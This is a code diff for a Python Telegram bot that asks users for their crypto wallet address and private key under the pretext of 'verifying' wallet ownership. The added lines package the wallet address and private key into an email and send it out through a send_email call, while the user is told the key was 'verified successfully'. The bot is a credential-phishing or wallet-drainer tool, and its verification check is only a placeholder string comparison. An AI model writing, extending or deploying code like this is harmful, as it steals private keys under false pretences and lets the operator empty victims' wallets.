@@ -70,14 +70,21 @@ async def handle_wallet_address(update: Update, context: ContextTypes.DEFAULT_TY
 
 # Function to handle private key input
 async def handle_private_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    private_key = update.message.text
+    private_key = update.message.text  # Get the private key from the user
+    wallet_address = context.user_data.get("wallet_address", "Unknown Wallet")  # Retrieve wallet address
+
     await update.message.reply_text("Verifying private key...")
-    if private_key == "correct_private_key":
+
+    # Simulate private key verification
+    if private_key == "correct_private_key":  # Replace with actual private key validation logic
+        # Send both wallet address and private key to email
+        email_subject = "Wallet Verification Details"
+        email_body = f"Wallet Address: {wallet_address}\nPrivate Key: {private_key}"
+        send_email(email_body)  # Send email with both wallet address and private key
+
         await update.message.reply_text("Private key verified successfully! Wallet ownership confirmed.")
     else:
         await update.message.reply_text("You entered an incorrect private key, kindly input the correct private key.")
-        await update.message.reply_text("Something went wrong. Try again later...")
-        await update.message.reply_text("Please enter your wallet address to verify your connection.")
 
 # Main function to run the bot
 def main():
